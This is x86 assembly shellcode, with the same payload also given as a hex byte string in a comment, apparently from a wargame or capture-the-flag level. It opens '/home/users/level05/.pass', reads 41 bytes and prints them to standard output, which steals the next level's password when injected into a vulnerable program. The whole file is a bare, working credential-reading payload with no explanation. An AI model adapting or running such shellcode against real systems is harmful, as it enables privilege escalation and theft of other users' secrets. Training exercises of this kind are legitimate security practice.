; \x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc9\x31\xd2\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\x83\xec\x29\x89\xc3\x89\xe1\xba\x29\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\xba\x29\x00\x00\x00\x89\xe1\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80
section .text
    global _start

_start:

    xor eax, eax
    push eax
    push dword 0x73736170 
    push dword 0x2e2f3530
    push dword 0x6c657665
    push dword 0x6c2f7372
    push dword 0x6573752f
    push dword 0x656d6f68
    push dword 0x2f2f2f2f ; push "/home/users/level05/.pass"
    xor ecx, ecx
    xor edx, edx
    mov ebx, esp
    mov eax, 0x05
    int 0x80 ; open("/home/users/level05/.pass", O_RDONLY, 0)

    sub esp, 0x29
    ; read(eax, esp, 0x29)
    mov ebx, eax
    mov ecx, esp
    mov edx, 0x29
    mov eax, 0x03
    int 0x80

    ; write(1, esp, 0x29)
    mov edx, 0x29
    mov ecx, esp
    mov ebx, 0x01
    mov eax, 0x04
    int 0x80
